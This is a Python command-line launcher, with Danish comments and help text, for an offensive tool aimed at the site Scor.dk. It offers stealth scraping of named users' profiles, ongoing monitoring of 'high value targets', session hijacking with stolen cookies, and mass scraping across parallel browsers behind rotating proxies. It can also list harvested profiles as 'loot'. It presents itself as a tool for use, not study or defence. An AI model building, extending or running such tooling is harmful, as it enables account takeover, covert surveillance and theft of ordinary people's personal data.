#!/usr/bin/env python3
# -*- coding: utf-8 -*-
"""
🚀 OMNI_HUNTER V62: SCOR.DK EXECUTION ENGINE
📌 Formål: CLI-interface til affyring af ScorHunter modulet.
"""

import asyncio
import argparse
from modules.mod_scor_hunter import ScorHunter
from core.utils import logger, C

async def main():
    parser = argparse.ArgumentParser(description="OMNI_HUNTER: Scor.dk Stealth Scraper & API Monitor")
    parser.add_argument("-t", "--target", type=str, help="Specifikt brugernavn til stealth profil-scraping")
    parser.add_argument("-m", "--monitor", type=str, help="Søgeord til kontinuerlig asynkron API overvågning")
    parser.add_argument("--show", action="store_true", help="Deaktiver headless mode (vis browseren)")
    parser.add_argument("--interval", type=int, default=60, help="Poll interval for monitor mode (sekunder)")
    parser.add_argument("--hijack-url", type=str, help="URL til at tilgå med stjålne cookies (Session Hijacking)")
    parser.add_argument("--cookies-file", type=str, help="Sti til JSON-fil med cookies til session hijacking")
    parser.add_argument("--batch-file", type=str, help="Sti til .txt fil med brugernavne til masse-scraping")
    parser.add_argument("--workers", type=int, default=5, help="Antal parallelle browsere til batch scraping")
    parser.add_argument("--proxies", type=str, help="Sti til .txt fil med proxies (format: http://ip:port)")
    # GOLIATH EXPANSION: Understøtter nu både --loot og --list-profiles
    parser.add_argument("-l", "--list-profiles", "--loot", dest="loot", action="store_true", help="Vis en liste over alle profiler høstet af Hunter-Killer modulet")
    
    args = parser.parse_args()
    headless_mode = not args.show

    if not any([args.target, args.monitor, args.hijack_url, args.loot, args.batch_file]):
        print(f"{C.RED}[!] OPSEC FEJL: Angiv enten --target eller --monitor for at starte.{C.RESET}")
        parser.print_help()
        return

    if args.target:
        print(f"{C.GREEN}[+] Starter GOLIATH Stealth Extraction mod: {args.target}{C.RESET}")
        # Starter synkron scraping
        hunter = ScorHunter(target_username=args.target, headless=headless_mode)
        hunter.stealth_extract_profile()

    if args.monitor:
        print(f"{C.CYAN}[*] Starter HVT API Monitor for: '{args.monitor}' (Interval: {args.interval}s){C.RESET}")
        # Starter asynkron evigheds-loop
        hunter = ScorHunter()
        await hunter.start_hvt_monitor(search_query=args.monitor, poll_interval=args.interval)
        
    if args.hijack_url:
        if not args.cookies_file:
            print(f"{C.RED}[!] OPSEC FEJL: --hijack-url kræver --cookies-file.{C.RESET}")
            return
        print(f"{C.MAGENTA}[!] Starter GOLIATH Session Hijack mod: {args.hijack_url}{C.RESET}")
        hunter = ScorHunter(headless=headless_mode)
        hunter.stealth_scrape_with_cookies(target_url=args.hijack_url, cookies_path=args.cookies_file)

    if args.batch_file:
        print(f"{C.MAGENTA}[*] Starter GOLIATH Asynkron Masse-ekstraktion fra fil: {args.batch_file}{C.RESET}")
        mass_hunter = ScorHunter(headless=headless_mode)
        await mass_hunter.stealth_extract_all_async(filepath=args.batch_file, max_concurrent=args.workers, proxies_file=args.proxies)
        return

    if args.loot:
        print(f"{C.CYAN}[*] OMNI_DATALAKE: Trækker liste over kompromitterede Scor.dk profiler...{C.RESET}")
        from core.utils import datalake
        records = datalake.get_harvested_targets("mod_scor%")
        
        if not records:
            print(f"{C.YELLOW}[!] Ingen profiler i Data Laket endnu. Lad Hunter-Killer dæmonen køre lidt længere.{C.RESET}")
        else:
            print(f"{C.GREEN}[+] GOLIATH LOOT: Fandt {len(records)} unikt høstede profiler i aktivt workspace:{C.RESET}")
            print(f"{C.DIM}{'-' * 55}{C.RESET}")
            for target, ts in records:
                dt_format = ts.replace('T', ' ')[:19] # Formaterer ISO timestamp til pæn læsbar dato
                print(f" 🎯 {C.BOLD}{target.ljust(25)}{C.RESET} | Opsnappet: {C.CYAN}{dt_format}{C.RESET}")
            print(f"{C.DIM}{'-' * 55}{C.RESET}")

if __name__ == "__main__":
    try:
        asyncio.run(main())
    except KeyboardInterrupt:
        print(f"\n{C.YELLOW}[*] Operation afbrudt af operatør (SIGINT). Lukker ned...{C.RESET}")